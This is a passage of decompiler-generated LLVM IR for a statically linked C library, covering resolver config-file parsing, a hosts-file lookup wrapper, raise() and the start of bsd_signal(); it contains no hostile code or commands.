  %v6_804f41b60 = phi i32 [ %v6_804f41b55, %dec_label_pc_804f425.lr.ph ], [ %v6_804f41b, %dec_label_pc_804f41a ]
  %v2_804f41b59 = phi i8 [ %v2_804f41b52, %dec_label_pc_804f425.lr.ph ], [ %v2_804f41b, %dec_label_pc_804f41a ]
  %v1_804f41b58 = phi i8* [ %v1_804f41b51, %dec_label_pc_804f425.lr.ph ], [ %v1_804f41b, %dec_label_pc_804f41a ]
  %v0_804f41a57 = phi i32 [ %v0_804f41b.pre, %dec_label_pc_804f425.lr.ph ], [ %v1_804f41a, %dec_label_pc_804f41a ]
  %v2_804f425 = sext i8 %v2_804f41b59 to i32
  store i32 %v2_804f425, i32* @edx, align 4
  store i32 %v0_804f428.pre, i32* @eax, align 4
  %v2_804f42d = mul nsw i32 %v2_804f425, 2
  %v3_804f42d = add i32 %v0_804f428.pre, %v2_804f42d
  %v4_804f42d = inttoptr i32 %v3_804f42d to i8*
  %v5_804f42d = load i8, i8* %v4_804f42d, align 1
  %v6_804f42d = and i8 %v5_804f42d, 32
  %v7_804f42d = icmp eq i8 %v6_804f42d, 0
  %v1_804f431 = icmp eq i1 %v7_804f42d, false
  br i1 %v1_804f431, label %dec_label_pc_804f41a, label %dec_label_pc_804f433

dec_label_pc_804f433:                             ; preds = %dec_label_pc_804f425
  %v10_804f433 = icmp eq i8 %v2_804f41b59, 10
  br i1 %v10_804f433, label %dec_label_pc_804f58e.backedge, label %dec_label_pc_804f43c

dec_label_pc_804f58e.backedge:                    ; preds = %dec_label_pc_804f41b.preheader, %dec_label_pc_804f41a, %dec_label_pc_804f554, %dec_label_pc_804f583, %dec_label_pc_804f55b, %dec_label_pc_804f433, %dec_label_pc_804f43c, %dec_label_pc_804f50d
  %v0_804f58e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804f595, i32* @ebx, align 4
  %v3_804f59a = call i32 @fgets(i32 %v2_804f595, i32 128, i32 %v0_804f58e)
  store i32 %v3_804f59a, i32* @eax, align 4
  %v1_804f5a2 = icmp eq i32 %v3_804f59a, 0
  %v1_804f5a4 = icmp eq i1 %v1_804f5a2, false
  br i1 %v1_804f5a4, label %dec_label_pc_804f41b.preheader, label %dec_label_pc_804f5aa

dec_label_pc_804f43c:                             ; preds = %dec_label_pc_804f433
  %v10_804f444 = icmp eq i8 %v2_804f41b59, 35
  %v1_804f447 = icmp eq i1 %v10_804f444, false
  br i1 %v1_804f447, label %dec_label_pc_804f498.preheader, label %dec_label_pc_804f58e.backedge

dec_label_pc_804f498.preheader:                   ; preds = %dec_label_pc_804f43c
  %v2_804f4986 = load i8, i8* %v1_804f41b58, align 1
  %v3_804f4987 = icmp eq i8 %v2_804f4986, 0
  br i1 %v3_804f4987, label %dec_label_pc_804f4a4, label %dec_label_pc_804f49d

dec_label_pc_804f44e:                             ; preds = %dec_label_pc_804f49d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804f452 = load i32, i32* @esp, align 4
  %v3_804f452 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804f452 = add nuw nsw i32 %v3_804f452, 152
  %v5_804f452 = add i32 %v4_804f452, %v1_804f452
  %v6_804f452 = inttoptr i32 %v5_804f452 to i32*
  store i32 %v0_804f452, i32* %v6_804f452, align 4
  %v0_804f45c.pre = load i32, i32* @ebx, align 4
  %v4_804f45c.pre = load i32, i32* @ecx, align 4
  %v1_804f45c61 = inttoptr i32 %v0_804f45c.pre to i8*
  %v2_804f45c62 = load i8, i8* %v1_804f45c61, align 1
  %v3_804f45c63 = zext i8 %v2_804f45c62 to i32
  %v5_804f45c64 = and i32 %v4_804f45c.pre, -256
  %v6_804f45c65 = or i32 %v3_804f45c63, %v5_804f45c64
  %v4_804f45e66 = icmp eq i8 %v2_804f45c62, 0
  br i1 %v4_804f45e66, label %dec_label_pc_804f47b.preheader, label %dec_label_pc_804f462.lr.ph

dec_label_pc_804f462.lr.ph:                       ; preds = %dec_label_pc_804f44e
  %v0_804f465.pre = load i32, i32* @global_var_8054320, align 32
  br label %dec_label_pc_804f462

dec_label_pc_804f45b:                             ; preds = %dec_label_pc_804f470
  %v1_804f45b = add i32 %v0_804f45b67, 1
  store i32 %v1_804f45b, i32* @ebx, align 4
  %v1_804f45c = inttoptr i32 %v1_804f45b to i8*
  %v2_804f45c = load i8, i8* %v1_804f45c, align 1
  %v3_804f45c = zext i8 %v2_804f45c to i32
  %v5_804f45c = and i32 %v6_804f45c69, -256
  %v6_804f45c = or i32 %v3_804f45c, %v5_804f45c
  %v4_804f45e = icmp eq i8 %v2_804f45c, 0
  br i1 %v4_804f45e, label %dec_label_pc_804f47b.preheader, label %dec_label_pc_804f462

dec_label_pc_804f462:                             ; preds = %dec_label_pc_804f462.lr.ph, %dec_label_pc_804f45b
  %v6_804f45c69 = phi i32 [ %v6_804f45c65, %dec_label_pc_804f462.lr.ph ], [ %v6_804f45c, %dec_label_pc_804f45b ]
  %v2_804f45c68 = phi i8 [ %v2_804f45c62, %dec_label_pc_804f462.lr.ph ], [ %v2_804f45c, %dec_label_pc_804f45b ]
  %v0_804f45b67 = phi i32 [ %v0_804f45c.pre, %dec_label_pc_804f462.lr.ph ], [ %v1_804f45b, %dec_label_pc_804f45b ]
  %v2_804f462 = sext i8 %v2_804f45c68 to i32
  store i32 %v2_804f462, i32* @edx, align 4
  store i32 %v0_804f465.pre, i32* @eax, align 4
  %v2_804f46a = mul nsw i32 %v2_804f462, 2
  %v3_804f46a = add i32 %v0_804f465.pre, %v2_804f46a
  %v4_804f46a = inttoptr i32 %v3_804f46a to i8*
  %v5_804f46a = load i8, i8* %v4_804f46a, align 1
  %v6_804f46a = and i8 %v5_804f46a, 32
  %v7_804f46a = icmp eq i8 %v6_804f46a, 0
  %v1_804f46e = icmp eq i1 %v7_804f46a, false
  br i1 %v1_804f46e, label %dec_label_pc_804f47b.preheader, label %dec_label_pc_804f470

dec_label_pc_804f470:                             ; preds = %dec_label_pc_804f462
  %v10_804f470 = icmp eq i8 %v2_804f45c68, 10
  %v1_804f473 = icmp eq i1 %v10_804f470, false
  br i1 %v1_804f473, label %dec_label_pc_804f45b, label %dec_label_pc_804f47b.preheader

dec_label_pc_804f47b.preheader:                   ; preds = %dec_label_pc_804f470, %dec_label_pc_804f462, %dec_label_pc_804f45b, %dec_label_pc_804f44e
  %v0_804f45b.lcssa = phi i32 [ %v0_804f45c.pre, %dec_label_pc_804f44e ], [ %v1_804f45b, %dec_label_pc_804f45b ], [ %v0_804f45b67, %dec_label_pc_804f462 ], [ %v0_804f45b67, %dec_label_pc_804f470 ]
  %v6_804f45c.lcssa = phi i32 [ %v6_804f45c65, %dec_label_pc_804f44e ], [ %v6_804f45c, %dec_label_pc_804f45b ], [ %v6_804f45c69, %dec_label_pc_804f462 ], [ %v6_804f45c69, %dec_label_pc_804f470 ]
  %v1_804f47b75 = inttoptr i32 %v0_804f45b.lcssa to i8*
  %v2_804f47b76 = load i8, i8* %v1_804f47b75, align 1
  %v3_804f47b77 = zext i8 %v2_804f47b76 to i32
  %v5_804f47b78 = and i32 %v6_804f45c.lcssa, -256
  %v6_804f47b79 = or i32 %v3_804f47b77, %v5_804f47b78
  store i32 %v6_804f47b79, i32* @ecx, align 4
  %v4_804f47d80 = icmp eq i8 %v2_804f47b76, 0
  br i1 %v4_804f47d80, label %dec_label_pc_804f494, label %dec_label_pc_804f481

dec_label_pc_804f477:                             ; preds = %dec_label_pc_804f48f, %dec_label_pc_804f481
  store i8 0, i8* %v1_804f47b82, align 1
  %v0_804f47a = load i32, i32* @ebx, align 4
  %v1_804f47a = add i32 %v0_804f47a, 1
  store i32 %v1_804f47a, i32* @ebx, align 4
  %v4_804f47b.pre = load i32, i32* @ecx, align 4
  %v1_804f47b = inttoptr i32 %v1_804f47a to i8*
  %v2_804f47b = load i8, i8* %v1_804f47b, align 1
  %v3_804f47b = zext i8 %v2_804f47b to i32
  %v5_804f47b = and i32 %v4_804f47b.pre, -256
  %v6_804f47b = or i32 %v3_804f47b, %v5_804f47b
  store i32 %v6_804f47b, i32* @ecx, align 4
  %v4_804f47d = icmp eq i8 %v2_804f47b, 0
  br i1 %v4_804f47d, label %dec_label_pc_804f494, label %dec_label_pc_804f481

dec_label_pc_804f481:                             ; preds = %dec_label_pc_804f47b.preheader, %dec_label_pc_804f477
  %v2_804f47b83 = phi i8 [ %v2_804f47b, %dec_label_pc_804f477 ], [ %v2_804f47b76, %dec_label_pc_804f47b.preheader ]
  %v1_804f47b82 = phi i8* [ %v1_804f47b, %dec_label_pc_804f477 ], [ %v1_804f47b75, %dec_label_pc_804f47b.preheader ]
  %v0_804f49881 = phi i32 [ %v1_804f47a, %dec_label_pc_804f477 ], [ %v0_804f45b.lcssa, %dec_label_pc_804f47b.preheader ]
  %v2_804f481 = sext i8 %v2_804f47b83 to i32
  store i32 %v2_804f481, i32* @edx, align 4
  %v0_804f484 = load i32, i32* @global_var_8054320, align 32
  store i32 %v0_804f484, i32* @eax, align 4
  %v2_804f489 = mul nsw i32 %v2_804f481, 2
  %v3_804f489 = add i32 %v0_804f484, %v2_804f489
  %v4_804f489 = inttoptr i32 %v3_804f489 to i8*
  %v5_804f489 = load i8, i8* %v4_804f489, align 1
  %v6_804f489 = and i8 %v5_804f489, 32
  %v7_804f489 = icmp eq i8 %v6_804f489, 0
  %v1_804f48d = icmp eq i1 %v7_804f489, false
  br i1 %v1_804f48d, label %dec_label_pc_804f477, label %dec_label_pc_804f48f

dec_label_pc_804f48f:                             ; preds = %dec_label_pc_804f481
  %v10_804f48f = icmp eq i8 %v2_804f47b83, 10
  br i1 %v10_804f48f, label %dec_label_pc_804f477, label %dec_label_pc_804f494

dec_label_pc_804f494:                             ; preds = %dec_label_pc_804f477, %dec_label_pc_804f48f, %dec_label_pc_804f47b.preheader
  %v0_804f498.lcssa = phi i32 [ %v0_804f45b.lcssa, %dec_label_pc_804f47b.preheader ], [ %v0_804f49881, %dec_label_pc_804f48f ], [ %v1_804f47a, %dec_label_pc_804f477 ]
  %v1_804f47b.lcssa = phi i8* [ %v1_804f47b75, %dec_label_pc_804f47b.preheader ], [ %v1_804f47b82, %dec_label_pc_804f48f ], [ %v1_804f47b, %dec_label_pc_804f477 ]
  %v4_804f494 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804f498 = load i8, i8* %v1_804f47b.lcssa, align 1
  %v3_804f498 = icmp eq i8 %v2_804f498, 0
  br i1 %v3_804f498, label %dec_label_pc_804f4a4, label %dec_label_pc_804f49d

dec_label_pc_804f49d:                             ; preds = %dec_label_pc_804f498.preheader, %dec_label_pc_804f494
  %v0_804f452 = phi i32 [ %v0_804f498.lcssa, %dec_label_pc_804f494 ], [ %v0_804f41a57, %dec_label_pc_804f498.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804f494, %dec_label_pc_804f494 ], [ 0, %dec_label_pc_804f498.preheader ]
  %v7_804f4a2 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804f4a2, label %dec_label_pc_804f4a4, label %dec_label_pc_804f44e

dec_label_pc_804f4a4:                             ; preds = %dec_label_pc_804f494, %dec_label_pc_804f49d, %dec_label_pc_804f498.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804f498.preheader ], [ %v4_804f494, %dec_label_pc_804f494 ], [ %stack_var_-196.013, %dec_label_pc_804f49d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804f4ab = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8052b87.406 to i32), i32* %stack_var_-216, align 4
  %v5_804f4b3 = call i32 @__GI_strcoll(i8* %v4_804f4b3, i32 ptrtoint ([11 x i8]* @global_var_8052b87.406 to i32), i32 %v0_804f4ab, i32 %v0_804f4ab)
  store i32 %v5_804f4b3, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_804f4c0 = icmp eq i32 %v5_804f4b3, 0
  br i1 %v1_804f4c0, label %dec_label_pc_804f4e8.preheader, label %dec_label_pc_804f4f9

dec_label_pc_804f4e8.preheader:                   ; preds = %dec_label_pc_804f4a4
  %v5_804f4ec90 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804f4ec90, label %dec_label_pc_804f4ee.lr.ph, label %dec_label_pc_804f4f9

dec_label_pc_804f4ee.lr.ph:                       ; preds = %dec_label_pc_804f4e8.preheader
  %v0_804f4ee.pre = load i32, i32* @global_var_8056dd4.339, align 4
  br label %dec_label_pc_804f4ee

dec_label_pc_804f4c6:                             ; preds = %dec_label_pc_804f4ee
  %v2_804f4c9 = mul i32 %v1_804f4c991, 4
  %v4_804f4c9 = add i32 %v2_804f4c9, %v3_804f4c9
  %v5_804f4c9 = inttoptr i32 %v4_804f4c9 to i32*
  %v6_804f4c9 = load i32, i32* %v5_804f4c9, align 4
  %v1_804f4d0 = inttoptr i32 %v6_804f4c9 to i8*
  %v2_804f4d0 = call i32 @__GI_strdup(i8* %v1_804f4d0)
  %v0_804f4d5 = load i32, i32* @esi, align 4
  %v1_804f4d5 = add i32 %v0_804f4d5, 1
  store i32 %v1_804f4d5, i32* @esi, align 4
  %v1_804f4d6 = load i32, i32* @ebx, align 4
  %v2_804f4d6 = mul i32 %v1_804f4d6, 4
  %v3_804f4d6 = add i32 %v2_804f4d6, 134573512
  %v4_804f4d6 = inttoptr i32 %v3_804f4d6 to i32*
  store i32 %v2_804f4d0, i32* %v4_804f4d6, align 4
  %v0_804f4dd = load i32, i32* @ebx, align 4
  %v1_804f4dd = add i32 %v0_804f4dd, 1
  store i32 %v1_804f4dd, i32* @eax, align 4
  store i32 %v1_804f4dd, i32* @global_var_8056dd4.339, align 4
  %v0_804f4e8.pre = load i32, i32* @esi, align 4
  %v5_804f4ec = icmp slt i32 %v0_804f4e8.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804f4ec, label %dec_label_pc_804f4ee, label %dec_label_pc_804f4f9

dec_label_pc_804f4ee:                             ; preds = %dec_label_pc_804f4ee.lr.ph, %dec_label_pc_804f4c6
  %v0_804f4ee = phi i32 [ %v0_804f4ee.pre, %dec_label_pc_804f4ee.lr.ph ], [ %v1_804f4dd, %dec_label_pc_804f4c6 ]
  %v1_804f4c991 = phi i32 [ 1, %dec_label_pc_804f4ee.lr.ph ], [ %v0_804f4e8.pre, %dec_label_pc_804f4c6 ]
  store i32 %v0_804f4ee, i32* @ebx, align 4
  %v7_804f4f7 = icmp sgt i32 %v0_804f4ee, 2
  br i1 %v7_804f4f7, label %dec_label_pc_804f4f9, label %dec_label_pc_804f4c6

dec_label_pc_804f4f9:                             ; preds = %dec_label_pc_804f4e8.preheader, %dec_label_pc_804f4c6, %dec_label_pc_804f4ee, %dec_label_pc_804f4a4
  %v0_804f4f9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8052b92.407 to i32), i32* %stack_var_-216, align 4
  %v0_804f500 = load i32, i32* @edi, align 4
  %v4_804f501 = inttoptr i32 %v0_804f500 to i8*
  %v5_804f501 = call i32 @__GI_strcoll(i8* %v4_804f501, i32 ptrtoint ([7 x i8]* @global_var_8052b92.407 to i32), i32 %v0_804f4f9, i32 %v0_804f4f9)
  store i32 %v5_804f501, i32* @eax, align 4
  %v1_804f509 = icmp eq i32 %v5_804f501, 0
  br i1 %v1_804f509, label %dec_label_pc_804f54b.preheader, label %dec_label_pc_804f50d

dec_label_pc_804f50d:                             ; preds = %dec_label_pc_804f4f9
  %v0_804f50d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8052b99.408 to i32), i32* %stack_var_-216, align 4
  %v0_804f514 = load i32, i32* @edi, align 4
  %v4_804f515 = inttoptr i32 %v0_804f514 to i8*
  %v5_804f515 = call i32 @__GI_strcoll(i8* %v4_804f515, i32 ptrtoint ([7 x i8]* @global_var_8052b99.408 to i32), i32 %v0_804f50d, i32 %v0_804f50d)
  %v1_804f51d = icmp eq i32 %v5_804f515, 0
  br i1 %v1_804f51d, label %dec_label_pc_804f54b.preheader, label %dec_label_pc_804f58e.backedge

dec_label_pc_804f54b.preheader:                   ; preds = %dec_label_pc_804f4f9, %dec_label_pc_804f50d
  %v0_804f54b92 = load i32, i32* @global_var_8056dd8.401, align 8
  %tmp4594 = icmp slt i32 %v0_804f54b92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_804f523, label %dec_label_pc_804f554

dec_label_pc_804f523:                             ; preds = %dec_label_pc_804f54b.preheader, %dec_label_pc_804f523.dec_label_pc_804f523_crit_edge
  %v0_804f54b96 = phi i32 [ %v0_804f54b, %dec_label_pc_804f523.dec_label_pc_804f523_crit_edge ], [ %v0_804f54b92, %dec_label_pc_804f54b.preheader ]
  %v1_804f523 = add i32 %v0_804f54b96, -1
  store i32 %v1_804f523, i32* @global_var_8056dd8.401, align 8
  %v1_804f52c = mul i32 %v1_804f523, 4
  %v2_804f52c = add i32 %v1_804f52c, 134573496
  %v3_804f52c = inttoptr i32 %v2_804f52c to i32*
  %v4_804f52c = load i32, i32* %v3_804f52c, align 4
  %v1_804f533 = call i32 @free(i32 %v4_804f52c)
  %v0_804f538 = load i32, i32* @global_var_8056dd8.401, align 8
  %v1_804f540 = mul i32 %v0_804f538, 4
  %v2_804f540 = add i32 %v1_804f540, ptrtoint (i32* @global_var_8056db8.409 to i32)
  %v3_804f540 = inttoptr i32 %v2_804f540 to i32*
  store i32 0, i32* %v3_804f540, align 4
  %v0_804f54b = load i32, i32* @global_var_8056dd8.401, align 8
  %tmp45 = icmp slt i32 %v0_804f54b, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_804f523.dec_label_pc_804f523_crit_edge, label %dec_label_pc_804f554

dec_label_pc_804f523.dec_label_pc_804f523_crit_edge: ; preds = %dec_label_pc_804f523
  br label %dec_label_pc_804f523

dec_label_pc_804f554:                             ; preds = %dec_label_pc_804f523, %dec_label_pc_804f54b.preheader
  %v0_804f54b.lcssa = phi i32 [ %v0_804f54b92, %dec_label_pc_804f54b.preheader ], [ %v0_804f54b, %dec_label_pc_804f523 ]
  store i32 1, i32* @esi, align 4
  %v5_804f581100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804f581100, label %dec_label_pc_804f583, label %dec_label_pc_804f58e.backedge

dec_label_pc_804f55b:                             ; preds = %dec_label_pc_804f583
  %v2_804f55e = mul i32 %v1_804f55e102, 4
  %v4_804f55e = add i32 %v2_804f55e, %v3_804f4c9
  %v5_804f55e = inttoptr i32 %v4_804f55e to i32*
  %v6_804f55e = load i32, i32* %v5_804f55e, align 4
  %v1_804f565 = inttoptr i32 %v6_804f55e to i8*
  %v2_804f565 = call i32 @__GI_strdup(i8* %v1_804f565)
  %v0_804f56a = load i32, i32* @esi, align 4
  %v1_804f56a = add i32 %v0_804f56a, 1
  store i32 %v1_804f56a, i32* @esi, align 4
  %v1_804f56b = load i32, i32* @ebx, align 4
  %v2_804f56b = mul i32 %v1_804f56b, 4
  %v3_804f56b = add i32 %v2_804f56b, 134573496
  %v4_804f56b = inttoptr i32 %v3_804f56b to i32*
  store i32 %v2_804f565, i32* %v4_804f56b, align 4
  %v0_804f572 = load i32, i32* @ebx, align 4
  %v1_804f572 = add i32 %v0_804f572, 1
  store i32 %v1_804f572, i32* @global_var_8056dd8.401, align 8
  %v0_804f57d.pre = load i32, i32* @esi, align 4
  %v5_804f581 = icmp slt i32 %v0_804f57d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804f581, label %dec_label_pc_804f583, label %dec_label_pc_804f58e.backedge

dec_label_pc_804f583:                             ; preds = %dec_label_pc_804f554, %dec_label_pc_804f55b
  %v1_804f55e102 = phi i32 [ %v0_804f57d.pre, %dec_label_pc_804f55b ], [ 1, %dec_label_pc_804f554 ]
  %v0_804f583101 = phi i32 [ %v1_804f572, %dec_label_pc_804f55b ], [ %v0_804f54b.lcssa, %dec_label_pc_804f554 ]
  store i32 %v0_804f583101, i32* @ebx, align 4
  %v7_804f58c = icmp sgt i32 %v0_804f583101, 3
  br i1 %v7_804f58c, label %dec_label_pc_804f58e.backedge, label %dec_label_pc_804f55b

dec_label_pc_804f41b.preheader:                   ; preds = %dec_label_pc_804f41b.preheader.lr.ph, %dec_label_pc_804f58e.backedge
  %v0_804f41b.pre = load i32, i32* @ebx, align 4
  %v4_804f41b.pre = load i32, i32* @ecx, align 4
  %v1_804f41b51 = inttoptr i32 %v0_804f41b.pre to i8*
  %v2_804f41b52 = load i8, i8* %v1_804f41b51, align 1
  %v3_804f41b53 = zext i8 %v2_804f41b52 to i32
  %v5_804f41b54 = and i32 %v4_804f41b.pre, -256
  %v6_804f41b55 = or i32 %v3_804f41b53, %v5_804f41b54
  store i32 %v6_804f41b55, i32* @ecx, align 4
  %v4_804f41d56 = icmp eq i8 %v2_804f41b52, 0
  br i1 %v4_804f41d56, label %dec_label_pc_804f58e.backedge, label %dec_label_pc_804f425.lr.ph

dec_label_pc_804f425.lr.ph:                       ; preds = %dec_label_pc_804f41b.preheader
  %v0_804f428.pre = load i32, i32* @global_var_8054320, align 32
  br label %dec_label_pc_804f425

dec_label_pc_804f5aa:                             ; preds = %dec_label_pc_804f58e.backedge, %dec_label_pc_804f58e.preheader
  %v0_804f5ad = load i32, i32* @ebp, align 4
  %v1_804f5ae = inttoptr i32 %v0_804f5ad to i16*
  %v2_804f5ae = call i32 @__GI_fclose(i16* %v1_804f5ae)
  br label %dec_label_pc_804f5c3

dec_label_pc_804f5b8:                             ; preds = %dec_label_pc_804f3f7
  %v0_804f5b8 = call i32 @__GI___h_errno_location()
  %v1_804f5bd = inttoptr i32 %v0_804f5b8 to i32*
  store i32 3, i32* %v1_804f5bd, align 4
  br label %dec_label_pc_804f5c3

dec_label_pc_804f5c3:                             ; preds = %entry, %dec_label_pc_804f5aa, %dec_label_pc_804f5b8
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804f3b0, i32* @eax, align 4
  %v2_804f5cf = call i32 @__pthread_return_void(i32 %v2_804f3b0, i32 1)
  store i32 %v0_804f39c, i32* @ebp, align 4
  ret i32 %v2_804f5cf

; uselistorder directives
  uselistorder i32 %v0_804f428.pre, { 1, 0 }
  uselistorder i32 %v6_804f41b55, { 1, 0 }
  uselistorder i8 %v2_804f41b52, { 1, 2, 0 }
  uselistorder i8* %v1_804f41b51, { 1, 0 }
  uselistorder i32 %v0_804f41b.pre, { 1, 0 }
  uselistorder i32 %v0_804f54b, { 0, 2, 1 }
  uselistorder i32 %v1_804f523, { 1, 0 }
  uselistorder i32 %v0_804f4ee, { 1, 0 }
  uselistorder i32 %v0_804f4e8.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804f481, { 1, 0 }
  uselistorder i8 %v2_804f47b83, { 1, 0 }
  uselistorder i32 %v2_804f462, { 1, 0 }
  uselistorder i8 %v2_804f45c68, { 1, 0 }
  uselistorder i32 %v1_804f45b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f425, { 1, 0 }
  uselistorder i32 %v1_804f41a, { 1, 0, 2 }
  uselistorder i32 %v2_804f595, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804f403, { 1, 0 }
  uselistorder i32 %v2_804f3e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 15, 12, 11, 10, 9, 8, 7, 6, 25, 24, 23, 22, 5, 4, 3, 2, 1, 0, 14, 13, 16, 21, 20, 19, 18, 17 }
  uselistorder i32* @global_var_8056dd8.401, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8056dd4.339, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054330.338 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804f5c3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f41b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f583, { 1, 0 }
  uselistorder label %dec_label_pc_804f523, { 1, 0 }
  uselistorder label %dec_label_pc_804f54b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f4f9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804f4ee, { 1, 0 }
  uselistorder label %dec_label_pc_804f4a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f49d, { 1, 0 }
  uselistorder label %dec_label_pc_804f494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f481, { 1, 0 }
  uselistorder label %dec_label_pc_804f462, { 1, 0 }
  uselistorder label %dec_label_pc_804f58e.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_804f58e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804f603 = inttoptr i32 %arg3 to i32*
  %v10_804f603 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804f603, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804f603
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f60f = call i32 @__libc_getpid()
  %v2_804f61b = call i32 @kill(i32 %v0_804f60f, i32 %arg1)
  ret i32 %v2_804f61b

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804f624 = load i32, i32* @ebx, align 4
  %v15_804f625 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804f639 = icmp eq i32 %arg2, -1
  br i1 %v10_804f639, label %dec_label_pc_804f647, label %dec_label_pc_804f63e

dec_label_pc_804f63e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804f647, label %dec_label_pc_804f642

dec_label_pc_804f642:                             ; preds = %dec_label_pc_804f63e
  %v7_804f645 = icmp sgt i32 %arg1, 64
  br i1 %v7_804f645, label %dec_label_pc_804f647, label %dec_label_pc_804f654

dec_label_pc_804f647:                             ; preds = %dec_label_pc_804f642, %dec_label_pc_804f63e, %entry
  %v1_804f647 = call i32 @__errno_location(i32 %v0_804f624)
  store i32 %v1_804f647, i32* %eax.global-to-local, align 4
  %v1_804f64c = inttoptr i32 %v1_804f647 to i32*
  store i32 22, i32* %v1_804f64c, align 4
  br label %dec_label_pc_804f6c8

dec_label_pc_804f654:                             ; preds = %dec_label_pc_804f642
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f662

dec_label_pc_804f662:                             ; preds = %dec_label_pc_804f662.dec_label_pc_804f662_crit_edge, %dec_label_pc_804f654
  %v0_804f662 = phi i32 [ %v15_804f625, %dec_label_pc_804f654 ], [ %v0_804f662.pre, %dec_label_pc_804f662.dec_label_pc_804f662_crit_edge ]
  %v1_804f66d17 = phi i32 [ 31, %dec_label_pc_804f654 ], [ %v1_804f66d, %dec_label_pc_804f662.dec_label_pc_804f662_crit_edge ]
  %v2_804f662 = mul i32 %v1_804f66d17, 4
  %v3_804f662 = add i32 %v2_804f662, 160
  %v4_804f662 = add i32 %v3_804f662, %v0_804f662
  %v5_804f662 = inttoptr i32 %v4_804f662 to i32*
  store i32 0, i32* %v5_804f662, align 4
  %v0_804f66d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804f66d = add i32 %v0_804f66d.pre, -1
  %v9_804f66d = icmp slt i32 %v1_804f66d, 0
  store i32 %v1_804f66d, i32* %eax.global-to-local, align 4
  %v1_804f66e = icmp eq i1 %v9_804f66d, false
  br i1 %v1_804f66e, label %dec_label_pc_804f662.dec_label_pc_804f662_crit_edge, label %dec_label_pc_804f670

dec_label_pc_804f662.dec_label_pc_804f662_crit_edge: ; preds = %dec_label_pc_804f662
  %v0_804f662.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f662

dec_label_pc_804f670:                             ; preds = %dec_label_pc_804f662
  %v0_804f670 = load i32, i32* @edx, align 4
  %v2_804f673 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804f673, i32* %eax.global-to-local, align 4
  %v4_804f67b = call i32 @__sigaddset(i32 %v2_804f673, i32 %arg1, i32 %v0_804f670, i32 %v0_804f670)
  store i32 %v4_804f67b, i32* %eax.global-to-local, align 4
  %v2_804f683 = icmp slt i32 %v4_804f67b, 0
  br i1 %v2_804f683, label %dec_label_pc_804f6c8, label %dec_label_pc_804f687

dec_label_pc_804f687:                             ; preds = %dec_label_pc_804f670
